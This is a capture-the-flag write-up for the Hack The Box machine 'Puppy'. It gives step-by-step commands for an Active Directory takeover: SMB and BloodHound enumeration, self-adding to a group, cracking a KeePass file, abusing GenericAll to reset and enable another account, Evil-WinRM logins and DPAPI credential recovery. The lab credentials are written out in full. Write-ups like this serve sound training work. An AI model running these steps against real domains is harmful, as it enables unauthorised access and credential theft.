This write-up details the exploitation of the Puppy (HTB) machine, starting from network and SMB enumeration to Active Directory privilege escalation. It covers the use of tools such as nmap, smbclient, BloodHound, and Evil-WinRM to gain initial access, extract credentials from KeePass, leverage GenericAll permissions, and ultimately retrieve the user and root flags through DPAPI credential decryption.

## Step 1: Initial Enumeration

Start by identifying open ports and services:

```bash

nmap -T4 -p- -v -A -oX puppy_tcp.scan 10.10.11.70 --webxml
```

## Step 2: SMB Enumeration

List SMB shares with the given credentials:

```bash
smbclient -L //10.10.11.70 -U levi.james --password=KingofAkron2025!
```

Check for the shares. Note that `DEV` share is accessible after privilege escalation.

## Step 3: Bloodhound Information Gathering

Run Bloodhound to find relationships and permissions:

```bash
bloodhound-python -d PUPPY.HTB -u levi.james -p "KingofAkron2025!" -gc dc.puppy.htb -c all -ns 10.10.11.70
```

## Step 4: Privilege Escalation to Developers

Add the user `levi.james` to the `Developers` group:

```bash
net rpc group addmem "Developers" "levi.james" -U "PUPPY.HTB"/"levi.james"%"KingofAkron2025!" -S "10.10.11.70"
```

## Step 5: DEV Share Access

Access the DEV share and download `recovery.kdbx`:

```bash
smbclient //10.10.11.70/DEV -U levi.james --password=KingofAkron2025! -c "get recovery.kdbx"
```

## Step 6: Extract Credentials from KeePass

Brute force `recovery.kdbx` using rockyou.txt or other methods. Extract `ant.edwards:Antman2025!`.

## Step 7: Exploit GenericAll on adam.silver

Change password for `adam.silver`:

```bash
net rpc password "adam.silver" "Test12345!" -U "PUPPY.HTB"/"ant.edwards"%"Antman2025!" -S "10.10.11.70"
```

Enable the account:

```bash
bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p Antman2025! remove uac adam.silver -f ACCOUNTDISABLE
```

## Step 8: Obtain User Flag

Connect as `adam.silver` to grab the user flag:

```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p Test12345!
```

## Step 9: Backup and Extract New Credentials

Download site backup and find `steph.cooper:ChefSteph2025!`. Connect as steph.cooper.

## Step 10: DPAPI and Root Flag

Access DPAPI credentials and decode master key. Use credentials `steph.cooper_adm:FivethChipOnItsWay2025!`:

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!
```

Access the Administrator's desktop for the root flag:

```bash
cat C:\Users\Administrator\Desktop\root.txt
```

